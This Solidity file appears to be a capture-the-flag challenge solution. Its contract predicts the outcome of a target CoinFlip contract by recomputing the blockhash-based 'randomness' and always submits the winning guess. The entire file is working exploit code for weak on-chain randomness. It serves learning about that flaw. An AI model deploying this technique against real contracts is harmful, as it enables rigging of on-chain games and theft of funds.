pragma solidity >=0.4.22 <0.9.0;

import "../Challenge/CoinFlip.sol";
import "../../lib/forge-std/src/console.sol";

contract CoinFlipGuesser {
    CoinFlip coinFlipContract;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address deployedCoinFlipAddress) public {
        coinFlipContract = CoinFlip(deployedCoinFlipAddress);
    }

    function flipGuesser() public returns (bool success) {
        uint256 initialConsecutiveWins = coinFlipContract.consecutiveWins();
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        coinFlipContract.flip(guess);

        uint256 newConsecutiveWins = coinFlipContract.consecutiveWins();
        if (newConsecutiveWins > initialConsecutiveWins) {
            {
                success = true;
            }
        }
    }
}
